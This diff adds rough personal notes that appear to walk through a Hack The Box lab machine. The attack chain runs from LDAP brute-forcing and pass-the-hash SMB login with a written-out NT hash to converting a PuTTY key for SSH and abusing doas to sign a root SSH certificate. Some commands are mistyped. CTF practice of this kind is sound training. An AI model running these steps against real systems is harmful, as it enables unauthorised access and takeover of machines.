@@ -1,0 +1,40 @@
+nmap -p 389 --script ldap-search 10.10.10.107
+
+nmap -p 389 --script ldap-brute --script-args ldap.base='"cn=Bob,dc=hackthebox,dc=htb"'  10.10.10.107 -d
+
+smbclient -U alice1978%0B186E661BBDBDCF6047784DE8B9FD8B --pw-nt-hash -L 10.10.10.107
+
+smbclient -U alice1978%0B186E661BBDBDCF6047784DE8B9FD8B --pw-nt-hash \\\\10.10.10.107\\alice
+
+
+we got some puttygen file
+
+we have to get id_rsa file using puttygen
+
+ puttygen my_private_key.ppk -O private-openssh -o id_rsa
+
+
+chmod 600 id_rsa
+
+ssh -i id_rsa alice1978@10.10.10.107
+
+wr got access
+
+next priv escla
+
+https://www.exploit-db.com/exploits/45742
+
+we have some tools call doas its work like sudo -l
+
+cat /etc/doas.conf
+cat /etc/ssh/sshd.conf
+
+ssh-keygen to create new key -d_rsa
+
+doas  -u userca /usr/bin/ssh-keygen -s /home/userca/ca -I root -n 3m3rgencyB4ckd00r /tmp/root_id_rsa
+
+we got new root root_id_rsa key
+
+ssh -i root_id_rsa root@10.10.10.107
+
+we got root.txt
